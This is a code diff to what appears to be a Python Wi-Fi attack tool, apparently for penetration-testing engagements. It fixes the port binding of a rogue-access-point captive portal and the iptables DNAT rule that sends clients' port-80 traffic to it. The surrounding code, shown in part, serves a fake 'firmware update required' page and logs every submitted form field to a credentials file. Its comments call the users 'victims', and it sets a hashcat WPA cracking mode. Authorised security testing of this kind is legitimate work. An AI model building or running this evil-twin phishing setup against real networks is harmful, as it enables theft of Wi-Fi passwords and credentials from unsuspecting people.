@@ -88,6 +88,11 @@ WLAN_IFACE = "wlan1"  # managed-mode name of the MT7921 attack dongle
 MON_IFACE = "mon0"    # monitor-mode name exposed by the helper (airbase-ng input)
 AP_TAP = "at0"        # tap interface airbase-ng creates for the rogue AP
 AP_GATEWAY = "10.0.0.1"  # captive-portal gateway IP assigned to the at0 tap
+# The captive portal binds a HIGH port on the gateway (not :80): lighttpd
+# (tar1090's ADS-B web UI) already holds 0.0.0.0:80 on this device, so binding
+# :80 would EADDRINUSE. AP clients still hit "port 80" — an iptables DNAT rule
+# redirects at0 :80 -> AP_GATEWAY:PORTAL_PORT.
+PORTAL_PORT = 8888
 
 # hashcat mode for combined WPA*-PBKDF2 PMKID + EAPOL (.hc22000 hashline format).
 HC22000_MODE = "22000"
@@ -445,12 +450,18 @@ def _dnsmasq_conf(
     return "\n".join(lines) + "\n"
 
 
-def _portal_script(*, creds_log: Path, ssid: str) -> str:
+def _portal_script(
+    *, creds_log: Path, ssid: str, gateway: str = AP_GATEWAY, port: int = PORTAL_PORT,
+) -> str:
     """Generate a stdlib-only captive-portal HTTP server.
 
     Serves a generic "firmware update required" page; any POSTed form fields are
     appended as a JSON line to *creds_log* (under engagements/<uuid>/). No third
     party deps so it runs from the system python3 on the device.
+
+    Binds (gateway, port) — a HIGH port on the AP gateway, NOT :80 — because
+    lighttpd already holds :80 on this device. The iptables DNAT in
+    _rogue_ap_command redirects AP clients' :80 to this port.
     """
     # Header carries the only interpolated values, as Python literals (repr) so
     # an SSID with quotes can never break out. The body below is fully static.
@@ -461,6 +472,7 @@ def _portal_script(*, creds_log: Path, ssid: str) -> str:
         "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
         f"CREDS_LOG = {str(creds_log)!r}\n"
         f"SSID = {ssid!r}\n"
+        f"BIND = ({gateway!r}, {int(port)})\n"
     )
     body = r'''
 PAGE = (
@@ -512,7 +524,7 @@ class Portal(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    HTTPServer(("0.0.0.0", 80), Portal).serve_forever()
+    HTTPServer(BIND, Portal).serve_forever()
 '''
     return header + body
 
@@ -566,9 +578,11 @@ def _rogue_ap_command(
         pp = q(str(portal_py))
         portal_launch = f"sudo -n python3 {pp} &\n"
         portal_reap = _reap(pp)
+        # Redirect AP clients' :80 to the portal's high port (it can't bind :80;
+        # lighttpd holds it). Victims still see a "port 80" portal via the DNAT.
         redir = (
             f"-t nat {{op}} PREROUTING -i {tapq} -p tcp --dport 80 "
-            f"-j DNAT --to-destination {gateway}:80"
+            f"-j DNAT --to-destination {gateway}:{PORTAL_PORT}"
         )
         iptables_add = f"sudo -n iptables {redir.format(op='-A')} 2>/dev/null\n"
         iptables_del = f"  sudo -n iptables {redir.format(op='-D')} 2>/dev/null\n"
